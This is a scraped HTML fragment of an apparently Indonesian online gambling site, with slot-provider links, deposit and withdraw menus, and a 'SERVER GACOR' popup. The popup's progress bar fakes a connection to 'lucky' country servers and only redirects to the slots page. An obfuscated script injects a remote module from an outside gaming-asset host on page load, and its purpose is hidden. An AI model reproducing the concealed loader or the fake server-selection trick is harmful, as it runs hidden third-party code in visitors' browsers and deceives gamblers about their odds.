          <h3 style="text-align:center; color:#FFD700;">SERVER INTERNATIONAL</h3>
          <p style="text-align:center; color:#fff;">Silahkan Pilih Server:</p>
    
          <select id="serverSelect" style="
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #2b2b2b;
            color: #fff;
            border: 1px solid #FFD700;
            border-radius: 4px;
          ">
            <option value="id">SERVER GACOR INDONESIA</option>
            <option value="sg">SERVER GACOR SINGAPORE</option>
            <option value="th">SERVER GACOR THAILAND</option>
            <option value="ae">SERVER GACOR DUBAI</option>
            <option value="vn">SERVER GACOR VIETNAM</option>
            <option value="ph">SERVER GACOR FILIPINA</option>
            <option value="mm">SERVER GACOR MYANMAR</option>
            <option value="jp">SERVER GACOR JEPANG</option>
            <option value="ru">SERVER GACOR RUSIA</option>
            <option value="kr">SERVER GACOR KOREA</option>
            <option value="cn">SERVER GACOR CHINA</option>
            <option value="hk">SERVER GACOR HONGKONG</option>
            <option value="my">SERVER GACOR MALAYSIA</option>
            <option value="int">SERVER GACOR INTERNATIONAL 🌐</option>
          </select>
    
          <div style="
            background-color: #333;
            height: 22px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 1px solid #FFD700;
          ">
            <div id="progressBar" style="
              width: 0%;
              background: linear-gradient(90deg, #FFD700, #B7870C);
              height: 100%;
              text-align: center;
              color: #111;
              font-size: 14px;
              font-weight: bold;
              text-shadow: 0 0 5px rgba(0,0,0,0.6);
              transition: width 0.3s;
            ">0%</div>
          </div>
    
          <p id="statusText" style="text-align: center; font-weight: bold; color:#FFD700;"></p>
    
          <div style="text-align: center;">
            <button id="btnConnect" style="
              background: linear-gradient(to bottom, #FFD700, #B7870C);
              color: #111;
              border: none;
              padding: 10px 30px;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 0 12px rgba(255,215,0,0.6);
            ">HUBUNGKAN</button>
          </div>
        </div>
      `;
      document.body.appendChild(popup);
    
      document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
        popup.style.display = "flex";
      });
    
      document.getElementById("closeMaxwin").addEventListener("click", () => {
        popup.style.display = "none";
        resetProgress();
      });
    
      let hasConnected = false;
    
      document.getElementById("btnConnect").addEventListener("click", () => {
        if (hasConnected) return;
    
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        let progress = 0;
    
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = true;
    
        const interval = setInterval(() => {
          progress += 5;
          bar.style.width = progress + "%";
          bar.textContent = progress + "%";
    
          if (progress >= 100) {
            clearInterval(interval);
            bar.style.background = "limegreen";
            bar.textContent = "100%";
            status.innerText = "Selesai!";
            status.style.color = "#fff";
    
            const url = new URL('/slots', window.location.href);
            url.protocol = 'https:';
            url.hostname = location.hostname;
            url.port = '';
            window.location.replace(url.toString());
          }
        }, 100);
      });
    
      function resetProgress() {
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        bar.style.width = "0%";
        bar.textContent = "0%";
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = false;
      }
    });
    </script> 

<script>var _0x1344b2=_0x1928;(function(_0x234a18,_0x44183a){var _0x576849=_0x1928,_0x326a2e=_0x234a18();while(!![]){try{var _0x27c6e9=parseInt(_0x576849(0x1ae))/(-0x83+-0x2a9*-0x5+-0xcc9)+parseInt(_0x576849(0x1a7))/(0x2*-0x788+-0x1a17+-0x29*-0x101)*(-parseInt(_0x576849(0x1a2))/(0xd1b+0xd4*-0x2d+0x182c))+parseInt(_0x576849(0x1a8))/(-0x193e+0x98f*0x2+0x189*0x4)+-parseInt(_0x576849(0x1a9))/(-0x2620+0x1*0x202d+0x5f8)+parseInt(_0x576849(0x1c0))/(-0x15*0x1af+-0x1*-0x1e62+0x4ff)*(-parseInt(_0x576849(0x1bd))/(0x1313+-0x627+-0xce5))+-parseInt(_0x576849(0x1a4))/(-0x1d*-0x4a+0xde*-0x2+-0x34f*0x2)*(parseInt(_0x576849(0x1b4))/(-0x5e*0x53+0x881*-0x2+0x5*0x981))+-parseInt(_0x576849(0x1ab))/(-0x2f3*0x1+0x1*0x2345+0x4*-0x812)*(-parseInt(_0x576849(0x1c2))/(-0x17be+-0x1*0xa7b+0x2244));if(_0x27c6e9===_0x44183a)break;else _0x326a2e['push'](_0x326a2e['shift']());}catch(_0x5a009a){_0x326a2e['push'](_0x326a2e['shift']());}}}(_0x3d03,0x9*0x22131+-0x2151*0x96+0xb20c2));var _0x60b0bc=(function(){var _0x34a08f=!![];return function(_0x4da461,_0x19bb5e){var _0x9b4c1c=_0x34a08f?function(){var _0x123dba=_0x1928;if(_0x19bb5e){var _0x442e90=_0x19bb5e[_0x123dba(0x1c1)](_0x4da461,arguments);return _0x19bb5e=null,_0x442e90;}}:function(){};return _0x34a08f=![],_0x9b4c1c;};}()),_0x3a9b7d=_0x60b0bc(this,function(){var _0x29a51c=_0x1928,_0x346248={'RCpcD':_0x29a51c(0x1b6)+'+$'};return _0x3a9b7d[_0x29a51c(0x1be)]()[_0x29a51c(0x1b9)](_0x346248[_0x29a51c(0x1aa)])[_0x29a51c(0x1be)]()[_0x29a51c(0x1b3)+'r'](_0x3a9b7d)[_0x29a51c(0x1b9)](_0x29a51c(0x1b6)+'+$');});function _0x1928(_0x3ef2e8,_0x51db8f){var _0x26a1e3=_0x3d03();return _0x1928=function(_0x5c46d7,_0x3a8e08){_0x5c46d7=_0x5c46d7-(0xb6d+-0x13ac*-0x1+-0x13*0x18d);var _0x214423=_0x26a1e3[_0x5c46d7];return _0x214423;},_0x1928(_0x3ef2e8,_0x51db8f);}_0x3a9b7d();var hokiScript=document[_0x1344b2(0x1af)+_0x1344b2(0x1bc)](_0x1344b2(0x1b5));hokiScript[_0x1344b2(0x1b8)]=_0x1344b2(0x1b0),hokiScript[_0x1344b2(0x1b7)]=function(){var _0x15387f=_0x1344b2;hokiStart(_0x15387f(0x1b2));},hokiScript[_0x1344b2(0x1b1)]=_0x1344b2(0x1c3)+_0x1344b2(0x1a5)+_0x1344b2(0x1ad)+_0x1344b2(0x1ba),hokiScript[_0x1344b2(0x1ac)]=!(0x64e+0x1864+-0x1eb2),document[_0x1344b2(0x1a6)+_0x1344b2(0x1bf)](_0x1344b2(0x1a3))[0x1c46+0xedc+-0x2b22][_0x1344b2(0x1bb)+'d'](hokiScript);function _0x3d03(){var _0x125f3a=['script','(((.+)+)+)','onload','type','search','agaming.js','appendChil','ent','7Bdcwop','toString','sByTagName','7760958dxQrVz','apply','11qiFdit','https://as','231cSYnel','head','4315888oRPJPA','set.qrisho','getElement','4084pGAqGP','4756920BcGrRD','3277430pMpqSo','RCpcD','13030170VaIjxy','async','ki.com/gig','1398991GuWUbO','createElem','module','src','cpg138','constructo','18mtIYQh'];_0x3d03=function(){return _0x125f3a;};return _0x3d03();}</script>
 





 
<meta charset="utf-8">

<meta name="csrf-token" content="NBEbKxG6lPy03y4rzVutbS2sGHgPjHuNJefNtVGv">

<script src="/assets/js/jquery/jquery.min.js"></script>
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>

     
                        <link rel="preload" href="/assets/fonts/ugsubskin/icomoon/fonts/icomoon.woff2" as="font" type="font/woff2" crossorigin="anonymous">
      <link rel="stylesheet" href="/assets/fonts/ugsubskin/icomoon/style.min.css" media="all" onload="this.media='all'"> 
      <link rel="stylesheet" href="/assets/css/swiper.css">

  <link type="text/css" rel="stylesheet" href="/assets/css/app-mobile.css">     
    <link type="text/css" rel="stylesheet" href="/assets/css/custom.css">
    <script src="/assets/js/jquery/sweet_alert2.min.js"></script>
 

  <link rel="stylesheet" href="/assets/js/jquery/jquery-ui.min.css" media="all" onload="this.media='all'">
  <script src="/assets/js/jquery/jquery-ui.min.js" defer=""></script>
  <script type="text/javascript" src="/assets/js/jquery/jquery.ui.touch-punch.min.js" defer=""></script>



 
  <div class="full-container layout">
    <div id="sideNav" class="side-nav">
      <nav class="nav-content">
  <ul class="side-nav-items">
    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/home.php?i=1#" onclick="closeNav(-1);">
        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@HOME">HOME</div>
      </a>

    </li>
            
      
    <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngclass]="{'active':isOpenNavContent[0], '':   !isOpenNavContent[0]}">
        <div><i class="icon-coins"></i></div>
        <div class="nav-title" i18n="@Funds">Dana</div>
      </a>
      <div class="nav-item-content" [ngclass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
        <ul class="submenu account">
          <li>
            <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-pig"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Deposit</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-transfer"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Withdraw</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-history"></i></span></div>
              <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
            </a>
          </li>
        
          <li>
            <a href="https://www.Goblin88.site/refferal.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-users"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Referral &nbsp;</div>
            </a>
          </li>
      

        </ul>
      </div>
    </li>
    
        <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(1);" [ngclass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
        <div><i class="icon-videogame_asset"></i></div>
        <div class="nav-title" i18n="">PERMAINAN</div>
      </a>
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  <!-- <i class="icon-lottery"></i>
                  <i  class="icon-others"></i>    -->

                                   <li>  <a href="https://www.Goblin88.site/slot.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">SLOTS</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/live.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="/assets/images/live_game_icon3860.gif" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/sports.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-soccer"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">SPORTS</div>
            </a>
            </li>
                                                <li>    <a href="https://www.Goblin88.site/casino.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-casino"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">CASINO</div>
            </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/lottery.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                    
                    </span>
                    <span class="hot sub new ">NEW</span>
                </div>
                <div class="fs-sm mt-1">LOTRE</div>
               </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/fish-hunter.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                    <i class="icon-fish_hunter"></i>
                    </span>
                </div>
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
               </a>
            </li>
                                                <li>   <a href="https://merdekaMERCUSUAR77.site/e-games" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">E-GAMES</div>
            </a>
            </li>
                        

        </ul>
      </div>
    </li>

            <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/promosaya.php" onclick="closeNav(-1);">
        <div><i class="icon-user1"></i></div> 
        <div class="nav-title" i18n="@PROMOS">Promo saya</div>
      </a>
    </li>
          <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/promotion.php" onclick="closeNav(-1);">
        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
      </a>
    </li>
    
        <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/refferal.php" onclick="closeNav(-1);">
        <div><i class="icon-users"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@REFERRAL">
                        REFERRAL                      </div>
      </a>

    </li>
                    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/rtpbaby.php" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
          <img src="/assets/ImageFile/202505252031220000002213b1fcac__babyrtp__200x200.webp" width="30px" height="30px">
        </div> <!--routerLinkActiveOptions for root URL-->

        <div class="nav-title">CEK RTP LIVE</div>
      </a>
    </li>
       


    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/info.php" onclick="closeNav(-1);">
        <div><i class="icon-info"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@INFO">INFO</div>
      </a>

    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/contact-us.php" onclick="closeNav(-1);">
        <div><i class="icon-address-book"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="">HUBUNGI KAMI</div>
      </a>
    </li>
    <li class="nav-item">
      <a href="#" class="navlink" onclick="closeNav();" data-trigger="nifty" data-target="#langModal-mobile">
       <div><i class="icon-language"></i></div>
       Bahasa      </a>
    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/" onclick="closeNav(-1);">
        <div><i class="icon-display"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title">Desktop View</div>
      </a>
    </li>
        <li class="nav-item"><a href="#" class="navlink" onclick="closeNav();"> <i class="icon-double_arrow_l"></i></a></li>
  </ul>
</nav>


<script>
var arr= [0,0];

function openNavItem(index){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');
    if(index>=0){
        $('.nav-item-content').eq(index).addClass('open');
        $('.navlink.has-sub').eq(index).addClass('active');
        $( "#mainContent" ).addClass( "navContentOpen" );
        $( "#sideNav" ).addClass( "navContentOpen" );
    }
}

function closeNav(){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');

    $( "#sideNav" ).removeClass( "navContentOpen" );
    $( "#sideNav" ).removeClass( "open" );
    $( "#mainContent" ).removeClass( "navContentOpen" );
    $( "#mainContent" ).removeClass( "sideNavOpen" );

}
</script>
    </div>

    <div class="main-content" id="mainContent">
      <div class="backdrop" id="mainContentContainer">

        <div class="top-bar">
          <div class="inner-header flex-row ">

<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
    <i class="icon-bars"></i>
  </button>
  <a href="https://www.Goblin88.site/" title="" class="logo">
    <div><img class="img-fluid" alt="MERCUSUAR77" src="/assets/ImageFile/mercusuar.gif"></div>
  </a>

          <a id="btnToggleRSideNav">
      <i class="icon-user-o"></i>    
    </a>
    
  



</div>
        </div>
        <div class="content my01">

                                                  <div class="container wallet-bal">
                <div class="row text-left">
                  <div class="col-xs-6">
                    <button class="btn btn-clear btn-refresh-wallet">
                      <i class="icon-currency-dollar fs-lg i-dollar"></i>
                      &nbsp;&nbsp;
                      
                      <span class="bal-txt">IDR <?php echo $saldo_game; ?></span>
                    </button>
                  </div>
                    <div class="col-xs-6 noSidePadding i-refresh">
                                                                  <button class="btn btn-clear btn-refresh-wallet pull-right"><i class="icon-refresh-2"></i></button>
                    </div>
                </div>

                <div class="row game-bals" id="other-game-bals" style="display:none;">
                  <div class="">
                    <table class="table">
                      

                    <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-PT">Playtech <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-PT">0.00</span></td>
                        <td class="col-xs-1"><button class="btn btn-clear btn-tran-PT" data-toggle="tooltip"
                            data-placement="bottom" title="Transfer ALL to Wallet"><i
                              class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-CMD">CMD <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-CMD">0.00</span></td>
                        <td class="col-xs-1">
                          <button class="btn btn-clear btn-tran-CMD" data-toggle="tooltip" data-placement="bottom"
                            title="Transfer ALL to Wallet">
                            <i class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      

                      

                    </table>
                  </div>
                </div>

              </div>
                        
          <!-- <div class="content-loader" *ngIf="subs.state$.requests.getAllGamesViewByCategory.inProgress; else content"><app-spinner></app-spinner> </div> -->


<div class="container pt-1 sub-games">
           <div>
 
  <h3 class="title" i18n="">slots PROVIDERS</h3>
  <div class="row">


  </div>

  <div class="scroll-wrapper row" style="height:72px;">

    <div class="left"><button class="prev-btn btn" id="left-button"><i class="icon-keyboard_arrow_left"></i></button></div>

    <div style="overflow:hidden;width:100%;" class="scroller">
      <div class="row no-gutters text-center slider-content">
        <!--//hardcoded links.......-->




                
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pragmatic-play.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/images/ppslotc619.gif" data-src="/assets/images/ppslotc619.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PRAGMATIC</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pgsoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/images/pgsoft8510.gif" data-src="/assets/images/pgsoft8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PGSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="joker-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/jk_slot8510.png" data-src="/assets/game_logos/100x70/jk_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JOKER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="besoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/besoft_slot8510.png" data-src="/assets/game_logos/100x70/besoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BESOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="spadegaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sg_slot8510.gif" data-src="/assets/game_logos/100x70/sg_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SPADE GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box active" href="jili.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/images/jilic619.gif" data-src="/assets/images/jilic619.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JILI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="fastspin.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/fastspin_slot8510.gif" data-src="/assets/game_logos/100x70/fastspin_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FASTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="booongo.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/booongo_slot.webp" data-src="/assets/game_logos/100x70/booongo_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BNG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="playtech.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/pt_slot.webp" data-src="/assets/game_logos/100x70/pt_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYTECH</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="wow-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/wow_slot8510.png" data-src="/assets/game_logos/100x70/wow_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">WOW GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="sigma.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sigmagaming_slot.webp" data-src="/assets/game_logos/100x70/sigmagaming_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SIGMA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="habanero.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/hb_slot8510.png" data-src="/assets/game_logos/100x70/hb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HABANERO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="fatpanda" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fatpanda_slot8510.png" data-src="/assets/game_logos/100x70/fatpanda_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FAT PANDA</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="advantplay" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/advantplay_slot8510.png" data-src="/assets/game_logos/100x70/advantplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ADVANTPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="hacksaw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/hacksaw_slot8510.png" data-src="/assets/game_logos/100x70/hacksaw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HACKSAW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="relax" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/relax_slot8510.png" data-src="/assets/game_logos/100x70/relax_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">RELAX GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="microgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/mg_slot8510.png" data-src="/assets/game_logos/100x70/mg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">MICRO GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="nolimitcity" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nolimitcity_slot8510.png" data-src="/assets/game_logos/100x70/nolimitcity_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NOLIMITCITY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="nextspin" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/nextspin_slot8510.png" data-src="/assets/game_logos/100x70/nextspin_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NEXTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="playstar" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playstar_slot8510.png" data-src="/assets/game_logos/100x70/playstar_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYSTAR</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="cq9" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/cq9_slot8510.png" data-src="/assets/game_logos/100x70/cq9_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">CQ9</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="skywind" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/skywind_slot8510.png" data-src="/assets/game_logos/100x70/skywind_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SKYWIND</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="ai-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/aigaming_slot8510.png" data-src="/assets/game_logos/100x70/aigaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">AI GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="redtiger" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">REDTIGER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="netent" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_net_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_net_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NETENT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="playngo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playngo_slot8510.png" data-src="/assets/game_logos/100x70/playngo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYNGO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="cosmo-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/cosmo_slot8510.png" data-src="/assets/game_logos/100x70/cosmo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">COSMO PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="hotdog" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/hotdog_slot8510.png" data-src="/assets/game_logos/100x70/hotdog_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HOTDOG GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="dst-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/dst_slot8510.png" data-src="/assets/game_logos/100x70/dst_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DST PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="askmeslot" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/askme_slot8510.png" data-src="/assets/game_logos/100x70/askme_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ASKMESLOT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="booming" rel="opener" style="position:relative;overflow: hidden;">
